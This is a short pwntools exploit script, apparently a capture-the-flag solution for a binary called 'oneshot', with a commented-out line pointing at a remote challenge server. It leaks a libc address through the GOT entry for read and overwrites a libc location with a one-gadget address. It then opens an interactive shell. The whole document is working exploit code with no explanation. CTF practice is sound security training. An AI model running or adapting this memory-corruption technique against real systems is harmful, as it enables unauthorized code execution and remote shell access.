from pwn import *

#r=remote('54.180.22.137',19303)
r=process('./oneshot',env={'LD_PRELOAD':'libc.so.6'})
e=ELF('./oneshot')
libc=ELF('./libc.so.6')

r.send(p64(e.got['read']))
leak=u64(r.recvuntil('\x7f').ljust(8,'\x00'))-libc.symbols['read']
log.info(hex(leak))
oneshot=leak+0x4f322
r.send(p64(leak+0x619f68))
sleep(1)
r.send(p64(oneshot))
r.interactive()